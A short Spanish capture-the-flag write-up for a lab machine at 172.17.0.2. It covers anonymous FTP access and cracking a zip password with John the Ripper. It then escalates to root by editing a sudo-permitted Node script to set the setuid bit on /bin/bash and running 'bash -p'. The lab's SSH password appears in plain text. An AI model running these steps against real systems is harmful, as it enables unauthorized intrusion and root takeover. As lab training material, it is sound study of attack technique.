## Reconocimiento:

Puerto 22 : SSH

Puerto 21 : FTP

El servicio esta habilitado para entrar con el usuario “anonymous” y sin contraseña.

```bash
ftp 172.17.0.2
```

Dentro hay un archivo .zip.

Para extraer la información pide contraseña, asi que utilizo John:

```bash
zip2john secretitopicaron.zip > hash

john --wordlist=<WORDLIST> hash
# Info:
password1
```

La contraseña es correcta, dentro hay un archivo con las credenciales SSH del usuario mario:

```bash
pass : laKontraseñAmasmalotaHdelbarrioH
```

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

El script script.js tiene permisos de edición, así que le hago lo siguiente:

```jsx
const { exec } = require("child_process");

// Comando para habilitar el bit setuid en /bin/bash
const command = "chmod u+s /bin/bash";

exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error ejecutando el comando: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Error de salida: ${stderr}`);
    return;
  }
  console.log(`Comando ejecutado exitosamente: ${stdout}`);
});
```

Lo ejecuto:

```bash
sudo node /home/mario/script.js
```

La bash debería tener premisos:

```bash
bash -p
```

Listo.
